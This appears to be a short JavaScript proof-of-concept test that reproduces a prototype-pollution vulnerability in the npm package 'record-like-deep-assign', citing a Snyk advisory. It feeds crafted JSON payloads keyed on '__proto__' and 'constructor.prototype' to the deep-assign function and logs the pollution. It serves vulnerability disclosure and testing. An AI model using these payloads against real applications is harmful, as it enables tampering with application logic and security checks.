// //https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024
// test("prototype pollution in x-assign", () => {
  const deepAssign = require("record-like-deep-assign");

console.log({}.polluted);

  let obj = {};
  //EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  EVIL_JSON = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
  deepAssign({}, EVIL_JSON);

console.log({}.polluted);
// });
